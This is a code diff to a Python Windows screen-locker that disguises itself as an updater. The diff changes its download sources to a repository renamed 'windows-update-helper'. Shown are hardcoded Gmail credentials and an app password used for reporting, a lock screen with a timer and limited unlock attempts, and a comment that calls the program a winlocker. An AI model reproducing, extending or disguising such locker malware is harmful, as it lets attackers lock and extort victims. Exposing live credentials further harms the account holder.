@@ -24,10 +24,10 @@ TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Mic
 GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
-VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/preview.mp4"
-MUSIC_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/them%D0%B3.mp3"
+VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/fuxEcorp.mp4.mp4"
+MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1).mp3"
 LOGO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/icon.png"
-VIDEO_PATH = os.path.join(tempfile.gettempdir(), "preview.mp4")
+VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
 MUSIC_PATH = os.path.join(tempfile.gettempdir(), "theme.mp3")
 LOGO_PATH = os.path.join(tempfile.gettempdir(), "icon.png")
 attempts_left = MAX_ATTEMPTS
@@ -282,14 +282,13 @@ def anim_connect():
     a.destroy()
 
 def play_video():
-    """Видео + музыка синхронно"""
+    """Видео + музыка синхронно, без консольных окон"""
     v_ok = download_file(VIDEO_URL, VIDEO_PATH)
     m_ok = download_file(MUSIC_URL, MUSIC_PATH)
     
     if not v_ok:
         return
     
-    # Запускаем музыку в отдельном потоке
     stop_music = threading.Event()
     
     def play_music():
@@ -310,7 +309,6 @@ def play_video():
         music_thread = threading.Thread(target=play_music, daemon=True)
         music_thread.start()
     
-    # Видео в главном потоке
     try:
         cap = cv2.VideoCapture(VIDEO_PATH)
         if not cap.isOpened():
@@ -461,7 +459,6 @@ class Updater:
         self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
         self.update_timer()
         
-        # Музыка для винлокера
         try:
             if download_file(MUSIC_URL, MUSIC_PATH):
                 if os.path.exists(MUSIC_PATH) and os.path.getsize(MUSIC_PATH) > 1000:
